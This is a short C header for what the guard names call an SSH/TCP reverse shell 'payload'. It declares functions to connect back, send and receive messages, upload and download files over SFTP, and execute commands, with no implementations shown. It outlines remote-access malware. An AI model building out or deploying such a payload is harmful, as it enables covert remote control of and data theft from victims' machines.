//
// Created by rip on 7/1/19.
//

#ifndef SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_C_H
#define SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_C_H


#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "libssh/libssh.h"
#include "libssh/sftp.h"
#include "utils.h"

#define MAX_BUFF_SIZE 50000


void setupSSH();
void doConnect();
void handleConnection();
void tearDown();
int openChannel();
void sendMsg(char*);
void rcvMsg(char*);
sftp_session setupSFTP();
void upload(char*, char*);
void download(char*, char*);
Array execCmd(char*);


#endif //SSH_TCP_REVERSE_SHELL_CPP_PAYLOAD_C_H
